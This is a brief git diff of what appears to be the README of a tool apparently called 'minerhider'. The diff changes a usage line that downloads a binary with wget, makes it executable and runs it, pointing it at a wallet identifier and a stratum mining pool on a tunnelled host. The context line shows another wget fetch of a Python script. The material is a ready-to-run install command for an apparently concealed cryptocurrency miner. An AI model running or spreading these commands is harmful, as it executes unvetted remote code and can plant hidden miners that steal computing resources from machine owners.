@@ -15,4 +15,4 @@ wget https://raw.githubusercontent.com/minhide/minmfth/refs/heads/main/clik.py &
 
 runing miner :
 
-usega : wget https://github.com/minhide/minerhider/raw/refs/heads/main/sh && chmod +x sh && ./sh RAMJiTYV7yXAuRQh1LXAHLHbBXGeYaPhXZ.mftvps stratum+tcp://wbnewtea-40878.portmap.host:40878 2 n
+usega : wget https://github.com/minhide/minmfth/raw/refs/heads/main/sh && chmod +x sh && ./sh RAMJiTYV7yXAuRQh1LXAHLHbBXGeYaPhXZ.mftvps stratum+tcp://wbnewtea-40878.portmap.host:40878 2 n
